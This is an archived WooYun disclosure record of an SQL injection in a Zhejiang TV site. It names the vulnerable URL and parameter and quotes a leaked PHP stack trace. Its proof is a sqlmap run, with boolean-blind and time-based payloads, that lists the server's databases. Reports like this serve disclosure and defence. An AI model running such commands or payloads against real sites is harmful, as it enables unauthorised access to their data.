{"id": 13199, "wybug_id": "wooyun-2013-022188", "wybug_title": "浙江卫视SQL注入漏洞，可遍历数据库内容", "wybug_corp": "cztv.com", "wybug_author": "piaox", "wybug_date": "2013-04-22 16:24", "wybug_open_date": "2013-04-27 16:25", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "12", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["数字类型注射", "错误信息未屏蔽", "配置错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 群里基友周末参加相亲，随手丢了相亲新闻报道连接，顺手看了下，发现有注入 详细说明：  \n\n祝愿有情人终成眷属，悲催的IT男早日找到娘子。习惯性的http://tv.cztv.com/admin，发现跳到http://mi.cztv.com/admin/login/indexhttp://mi.cztv.com/star?user_id=62、分别在参数值后'、-1、-0确定存在注入\nFatal error: Uncaught exception 'Exception' with message 'String could not be parsed as XML' in /opt/cztv_data/cztv/tool/cztv_new/library/rest_common.php:318 Stack trace: #0 /opt/cztv_data/cztv/tool/cztv_new/library/rest_common.php(318): SimpleXMLElement->__construct('<br />?<b>Fatal...') #1 /opt/cztv_data/cztv/tool/cztv_new/library/RestClient.php(129): xmlToArray('<br />?<b>Fatal...') #2 /opt/cztv_data/cztv/tool/cztv_new/library/RestClient.php(194): RestClient->call('PUT', '{\"user_id\":\"62\\...') #3 /opt/cztv_data/cztv/tool/cztv_new/applications/cztv/home/controller/starController.php(41): RestClient->post('getPhotoList', Object(RestParam)) #4 [internal function]: StarController->indexAction() #5 /opt/cztv_data/cztv/tool/cztv_new/library/Route.php(229): call_user_func_array(Array, Array) #6 /opt/cztv_data/cztv/tool/cztv_new/index.php(24): Route->dispatch() #7 {main} thrown in /opt/cztv_data/cztv/tool/cztv_new/library/rest_common.php on line 318\n   漏洞证明：  \nD:\\python2.7\\sqlmap>sqlmap.py -u http://mi.cztv.com/star?user_id=62 --dbsPlace: GETParameter: user_id    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: user_id=62 AND 5701=5701    Type: AND/OR time-based blind    Title: MySQL > 5.0.11 AND time-based blind    Payload: user_id=62 AND SLEEP(5)---[12:29:38] [INFO] the back-end DBMS is MySQLweb application technology: Nginx, PHP 5.2.13back-end DBMS: MySQL 5.0.11[12:29:38] [INFO] fetching database names[12:29:38] [INFO] fetching number of databases[12:29:38] [INFO] resumed: 8[12:29:38] [INFO] resumed: information_schema[12:29:38] [INFO] resumed: mysql[12:29:38] [INFO] resumed: performance_schema[12:29:38] [INFO] resumed: test[12:29:38] [INFO] resumed: weibo[12:29:38] [INFO] resumed: zj_platform_home[12:29:38] [INFO] resumed: zj_user_center[12:29:38] [INFO] resumed: zjwebtvavailable databases [8]:[*] information_schema[*] mysql[*] performance_schema[*] test[*] weibo[*] zj_platform_home[*] zj_user_center[*] zjwebtv\n   修复方案：  过滤吧！   版权声明：转载请注明来源 piaox@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2013-04-27 16:25 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-24 18:59 |    \t\tpiaox \t\t\t( 普通白帽子  |\t\t\t        Rank:239 漏洞数:41        )\t\t \n  这厂商忘记回应了吧？    \n     2013-04-27 17:16 |    \t\t新蓝网(乌云厂商)\t\t \n  回应了啊？怎么回事？    \n     2013-04-27 21:27 |    \t\tpiaox \t\t\t( 普通白帽子  |\t\t\t        Rank:239 漏洞数:41        )\t\t \n  忽略了    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}